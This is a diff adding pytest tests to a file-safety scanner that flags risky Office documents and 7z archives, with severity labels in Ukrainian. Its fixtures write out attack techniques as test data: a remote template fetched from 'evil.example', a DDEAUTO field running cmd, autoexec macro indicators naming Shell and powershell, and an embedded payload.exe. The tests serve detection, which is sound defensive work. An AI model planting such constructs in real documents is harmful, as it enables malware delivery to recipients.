@@ -1,3 +1,7 @@
+import py7zr
+from filetrust.analyzers.archive import check_7z
+from filetrust.analyzers.office import check_ooxml, macro_findings
+from filetrust.detect import kind_from_mime
 from filetrust.analyzers.common import check_name, check
 from filetrust.detect import inspect_file
 from filetrust.models import Finding
@@ -240,3 +244,130 @@ def test_bad_link_reason():
     assert bad_link_reason("https://xn--80ak6aa92e.com")
     assert bad_link_reason("https://example.com") is None
     assert bad_link_reason("/relative/path") is None
+def make_office(path, extra):
+    files = {"[Content_Types].xml": b"<Types/>",
+             "word/document.xml": b"<w:document/>"}
+    files.update(extra)
+    make_zip(path, files)
+
+
+def make_7z(path, files):
+    with py7zr.SevenZipFile(path, "w") as z:
+        for name, data in files.items():
+            z.writestr(data, name)
+
+
+def test_macro_enabled_mime_is_ooxml():
+    assert kind_from_mime(
+        "application/vnd.ms-word.document.macroEnabled.12") == "ooxml"
+    assert kind_from_mime("application/vnd.ms-excel") == "ole"
+
+
+def test_office_clean(tmp_path):
+    p = tmp_path / "a.docx"
+    make_office(p, {})
+    assert check_ooxml(inspect_file(p, "a.docx")) == []
+
+
+def test_office_ignores_plain_zip(tmp_path):
+    p = tmp_path / "b.zip"
+    make_zip(p, {"notes.txt": b"hello"})
+    assert check_ooxml(inspect_file(p, "b.zip")) == []
+
+
+def test_office_macro_docm(tmp_path):
+    p = tmp_path / "c.docm"
+    make_office(p, {"word/vbaProject.bin": b"junk"})
+    found = ids(check_ooxml(inspect_file(p, "c.docm")))
+    assert "OFFICE_MACRO" in found
+    assert "OFFICE_MACRO_HIDDEN_EXT" not in found
+
+
+def test_office_macro_hidden_in_docx(tmp_path):
+    p = tmp_path / "d.docx"
+    make_office(p, {"word/vbaProject.bin": b"junk"})
+    findings = check_ooxml(inspect_file(p, "d.docx"))
+    assert "OFFICE_MACRO_HIDDEN_EXT" in ids(findings)
+    assert "ВИСОКИЙ" in score(findings)[1]
+
+
+def test_office_remote_template(tmp_path):
+    p = tmp_path / "e.docx"
+    rels = (b'<?xml version="1.0"?><Relationships xmlns="x">'
+            b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org'
+            b'/officeDocument/2006/relationships/attachedTemplate" '
+            b'Target="http://evil.example/t.dotm" TargetMode="External"/>'
+            b'</Relationships>')
+    make_office(p, {"word/_rels/settings.xml.rels": rels})
+    assert "OFFICE_REMOTE_CONTENT" in ids(check_ooxml(inspect_file(p, "e.docx")))
+
+
+def test_office_ip_hyperlink(tmp_path):
+    p = tmp_path / "f.docx"
+    rels = (b'<Relationships><Relationship Id="rId1" '
+            b'Type="http://schemas.openxmlformats.org/officeDocument/2006'
+            b'/relationships/hyperlink" Target="http://10.0.0.5/x" '
+            b'TargetMode="External"/></Relationships>')
+    make_office(p, {"word/_rels/document.xml.rels": rels})
+    assert "OFFICE_SUSPICIOUS_LINK" in ids(check_ooxml(inspect_file(p, "f.docx")))
+
+
+def test_office_dde(tmp_path):
+    p = tmp_path / "g.docx"
+    make_office(p, {"word/document.xml":
+                    b'<w:instrText> DDEAUTO cmd "/k calc" </w:instrText>'})
+    assert "OFFICE_DDE" in ids(check_ooxml(inspect_file(p, "g.docx")))
+
+
+def test_office_embedded_exe(tmp_path):
+    p = tmp_path / "h.docx"
+    make_office(p, {"word/embeddings/payload.exe": b"x"})
+    assert "OFFICE_EMBEDDED_EXEC" in ids(check_ooxml(inspect_file(p, "h.docx")))
+
+
+def test_macro_chain_is_red():
+    results = [
+        ("AutoExec", "Document_Open", "runs on open"),
+        ("Suspicious", "Shell", "runs a command"),
+        ("Suspicious", "powershell", "runs powershell"),
+        ("IOC", "http://evil.example/a.exe", "URL"),
+    ]
+    findings = macro_findings(results)
+    assert ids(findings) == ["OFFICE_MACRO", "OFFICE_MACRO_AUTOEXEC",
+                             "OFFICE_MACRO_SUSPICIOUS", "OFFICE_MACRO_IOC"]
+    assert "ВИСОКИЙ" in score(findings)[1]
+
+
+def test_macro_autoexec_only_is_yellow():
+    findings = macro_findings([("AutoExec", "Workbook_Open", "runs on open")])
+    assert ids(findings) == ["OFFICE_MACRO", "OFFICE_MACRO_AUTOEXEC"]
+    assert "ПІДОЗРІЛО" in score(findings)[1]
+
+
+def test_pipeline_docx_with_hidden_macro_is_red(tmp_path):
+    p = tmp_path / "r.docx"
+    make_office(p, {"word/vbaProject.bin": b"junk"})
+    info, findings = analyze(p, "report.docx")
+    assert "OFFICE_MACRO_HIDDEN_EXT" in ids(findings)
+    assert "ВИСОКИЙ" in score(findings)[1]
+
+
+def test_7z_with_exe(tmp_path):
+    p = tmp_path / "a.7z"
+    make_7z(p, {"setup.exe": b"MZ" + b"\x00" * 100})
+    info = inspect_file(p, "a.7z")
+    assert info.kind == "7z"
+    assert "ARCHIVE_EXEC" in ids(check_7z(info))
+
+
+def test_7z_clean(tmp_path):
+    p = tmp_path / "b.7z"
+    make_7z(p, {"photo.jpg": b"x", "notes.txt": b"hello"})
+    assert check_7z(inspect_file(p, "b.7z")) == []
+
+
+def test_7z_encrypted(tmp_path):
+    p = tmp_path / "c.7z"
+    with py7zr.SevenZipFile(p, "w", password="secret") as z:
+        z.writestr(b"hello", "notes.txt")
+    assert "ARCHIVE_ENCRYPTED" in ids(check_7z(inspect_file(p, "c.7z")))
